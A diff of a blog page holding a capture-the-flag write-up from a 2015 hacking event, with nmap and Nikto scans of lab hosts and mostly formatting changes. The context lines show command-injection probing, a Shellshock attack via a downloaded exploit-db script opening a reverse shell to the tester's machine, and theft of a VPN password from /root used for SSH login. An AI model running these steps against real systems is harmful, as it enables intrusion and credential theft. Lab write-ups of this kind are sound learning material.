@@ -60,7 +60,7 @@
                            <ul class="dropdown-menu">
                                <li><a href="http://blog.dornea.nu/category/blog">
                                       <i class="icon-pencil"></i>blog
-                                      (114)</a></li>
+                                      (116)</a></li>
                                <li><a href="http://blog.dornea.nu/category/low">
                                    <i class="icon-folder-close"></i>LOW
                                       (27)</a></li>
@@ -145,8 +145,7 @@
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
 <p>First run <code>nmap</code> for assigned IP range (<strong>10.10.10.20-29</strong>):</p>
-<pre><code>$ nmap -A -T4 10.10.10.20-29
-</code></pre>
+<pre><code>$ nmap -A -T4 10.10.10.20-29</code></pre>
 </div>
 </div>
 </div>
@@ -184,7 +183,9 @@ PORT    STATE SERVICE VERSION
 |   100024  1          47289/tcp  status
 |_  100024  1          52014/udp  status
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre><p>2) <strong>Nikto</strong> results:</p>
+
+</code></pre>
+<p>2) <strong>Nikto</strong> results:</p>
 <pre><code>- Nikto v2.1.5
 ---------------------------------------------------------------------------
 + Target IP:          10.10.10.20
@@ -205,7 +206,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 + End Time:           2015-06-03 17:36:26 (GMT2) (25 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
-</code></pre><p><br/>
+
+</code></pre>
+<p><br/>
 <strong>Observations</strong>:</p>
 <hr/>
 <ul>
@@ -214,8 +217,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 <li><p><a href="http://10.10.10.20/private/info.txt">http://10.10.10.20/private/info.txt</a> contained:</p>
 <pre><code>  user@localhost:# 
   user@localhost:# mail 
-  user@localhost:# hostname
-</code></pre></li>
+  user@localhost:# hostname</code></pre>
+</li>
 </ul>
 <p><br/>
 <strong>Solutions</strong>:</p>
@@ -257,7 +260,9 @@ PORT   STATE SERVICE VERSION
 |_See http://nmap.org/nsedoc/scripts/http-methods.html
 |_http-title: Apache Tomcat
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre><p>2) <strong>Nikto</strong> results:</p>
+
+</code></pre>
+<p>2) <strong>Nikto</strong> results:</p>
 <pre><code>- Nikto v2.1.5
 ---------------------------------------------------------------------------
 + Target IP:          10.10.10.21
@@ -281,7 +286,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 + 6545 items checked: 0 error(s) and 12 item(s) reported on remote host
 + End Time:           2015-06-03 14:45:56 (GMT2) (76 seconds)
 ---------------------------------------------------------------------------
-</code></pre><p><br/>
+
+</code></pre>
+<p><br/>
 <strong>Observations</strong>:</p>
 <hr/>
 <ul>
@@ -340,7 +347,9 @@ PORT     STATE SERVICE VERSION
 |   100024  1            873/udp  status
 |_  100024  1            876/tcp  status
 3306/tcp open  mysql   MySQL (unauthorized)
-</code></pre><p>2) <strong>Nikto</strong> results:</p>
+
+</code></pre>
+<p>2) <strong>Nikto</strong> results:</p>
 <pre><code>- Nikto v2.1.5
 ---------------------------------------------------------------------------
 + Target IP:          10.10.10.22
@@ -359,7 +368,9 @@ PORT     STATE SERVICE VERSION
 + 6545 items checked: 0 error(s) and 7 item(s) reported on remote host
 + End Time:           2015-06-03 14:54:40 (GMT2) (86 seconds)
 ---------------------------------------------------------------------------
-</code></pre><p><br/>
+
+</code></pre>
+<p><br/>
 <strong>Observations</strong>:</p>
 <hr/>
 <ul>
@@ -388,8 +399,8 @@ PORT     STATE SERVICE VERSION
   &lt; Content-Type: text/plain; charset=UTF-8
   &lt; 
   hello hacker
-  * Closing connection 0
-</code></pre></li>
+  * Closing connection 0</code></pre>
+</li>
 <li><p>Modifying the parameters lead to:</p>
 <pre><code>  $ curl -v "http://10.10.10.22/cgi-bin/hello.sh?hacker;asdk;ping alkjsd"
   *   Trying 10.10.10.22...
@@ -407,8 +418,8 @@ PORT     STATE SERVICE VERSION
   &lt; Content-Type: text/plain; charset=UTF-8
   &lt; 
   hello hacker\;asdk\;ping
-  * Closing connection 0
-</code></pre></li>
+  * Closing connection 0</code></pre>
+</li>
 <li><p>Apache, cgi-bin, hello.sh ... That looked like a potential <strong>shellshock</strong> attack:</p>
 <pre><code>  $ curl -v -H "$(cat request)" "http://10.10.10.22/cgi-bin/hello.sh?hacker"
   *   Trying 10.10.10.22...
@@ -442,19 +453,19 @@ PORT     STATE SERVICE VERSION
   &lt;hr&gt;
   &lt;address&gt;Apache/2.2.3 (CentOS) Server at 10.10.10.22 Port 80&lt;/address&gt;
   &lt;/body&gt;&lt;/html&gt;
-  * Closing connection 0
-</code></pre><p>  In the above curl output you can see that the <strong>User-Agent</strong> contains the payload:</p>
+  * Closing connection 0</code></pre>
+<p>In the above curl output you can see that the <strong>User-Agent</strong> contains the payload:</p>
 <pre><code>  * run **netcat** and listen on port **4445**
-  * when connecting to this port a new **bash** instance should be spawned
-</code></pre></li>
+  * when connecting to this port a new **bash** instance should be spawned</code></pre>
+</li>
 <li><p>Unfortunately the manual way didn't work so we've found this <a href="https://www.exploit-db.com/exploits/34900/">Apache mod_cgi - ShellshockRemote Exploit</a>:</p>
 <pre><code>  $ wget https://www.exploit-db.com/download/34900 -o shellshock.py
-  $ python2 shellshock.py payload=reverse rhost=10.10.10.22 \
+$ python2 shellshock.py payload=reverse rhost=10.10.10.22 \
       lhost=10.10.10.95 lport=4447 pages=http://10.10.10.22/cgi-bin/hello.sh
-  ...
-</code></pre><p>  That will give you a reverse shell on port 4447.</p>
+  ...</code></pre>
+<p>That will give you a reverse shell on port 4447.</p>
 </li>
-<li><p>Havin the shell access to the machine we've stared investigating the permissions on the file system. We've found out that current user (www-data I think) was able to read files inside <strong>/root</strong>. </p>
+<li><p>Havin the shell access to the machine we've stared investigating the permissions on the file system. We've found out that current user (www-data I think) was able to read files inside <strong>/root</strong>.</p>
 <pre><code>  10.10.10.22&gt; ls -l
       total 36
       -rw-r--r-- 1 root root 20396 May 18  2014 install.log
@@ -462,8 +473,8 @@ PORT     STATE SERVICE VERSION
       -rw-r--r-- 1 root root    13 Feb 25 07:56 password-for-vpn.txt
 
   10.10.10.22&gt; cat password-for-vpn.txt
-  VeRySeCuRe_7
-</code></pre></li>
+  VeRySeCuRe_7</code></pre>
+</li>
 <li>Loging in as <strong>user:VeRySeCuRe_7</strong> per SSH was then successful</li>
 </ul>
 </div>
@@ -521,7 +532,9 @@ Host script results:
 |   SMB Security: Challenge/response passwords supported
 |_  Message signing disabled (dangerous, but default)
 |_smbv2-enabled: Server supports SMBv2 protocol
-</code></pre><p><br/>
+
+</code></pre>
+<p><br/>
 <strong>Observations</strong>:</p>
 <hr/>
 <ul>
@@ -570,7 +583,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
 Nmap done: 10 IP addresses (5 hosts up) scanned in 66.17 seconds
-</code></pre><p>2) <strong>Nikto</strong> results:</p>
+
+</code></pre>
+<p>2) <strong>Nikto</strong> results:</p>
 <pre><code>- Nikto v2.1.5
  ---------------------------------------------------------------------------
  + Target IP:          10.10.10.24
@@ -596,7 +611,9 @@ Nmap done: 10 IP addresses (5 hosts up) scanned in 66.17 seconds
  + /admin/login.php: Admin login page/section found.
  + 6545 items checked: 0 error(s) and 14 item(s) reported on remote host
  + End Time:           2015-06-03 15:01:58 (GMT2) (69 seconds)
-</code></pre><p><br/>
+
+</code></pre>
+<p><br/>
 <strong>Observations</strong>:</p>
 <hr/>
 <ul>
@@ -640,7 +657,7 @@ Nmap done: 10 IP addresses (5 hosts up) scanned in 66.17 seconds
 </div>
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<p>I'd like to thank <a href="https://www.usd.de/">usd AG</a> for the organizational part and all participants for having a great time in Hamburg City. </p>
+<p>I'd like to thank <a href="https://www.usd.de/">usd AG</a> for the organizational part and all participants for having a great time in Hamburg City.</p>
 <p><img class="img-responsive" src="http://dl.dornea.nu/img/2015/hackertag/4f41c02eeeb8fbee62da2751ffd913bc.jpg" width="99%"/></p>
 </div>
 </div>
@@ -689,8 +706,8 @@ Nmap done: 10 IP addresses (5 hosts up) scanned in 66.17 seconds
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/networking/">networking</a><sup>39</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/security/">security</a><sup>35</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/usd/">usd</a><sup>2</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ctf/">ctf</a><sup>8</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>13</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ctf/">ctf</a><sup>10</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>15</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/events/">events</a><sup>6</sup></div>
                 </div>
 
